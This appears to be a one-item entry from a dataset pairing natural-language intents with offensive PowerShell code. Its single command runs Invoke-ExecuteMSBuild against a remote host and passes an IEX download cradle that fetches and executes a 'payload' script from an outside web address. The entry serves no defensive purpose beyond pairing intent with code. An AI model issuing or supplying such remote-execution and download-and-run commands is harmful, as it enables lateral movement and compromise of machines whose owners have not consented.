# Natural language intent:
# Invoke ExecuteMSBuild on a remote computer to download and execute a payload.

Invoke-ExecuteMSBuild -ComputerName 'napoli.vita.org' -Command IEX (New-Object net.webclient).DownloadString('http://www.getyourpowershellhere.com/payload')
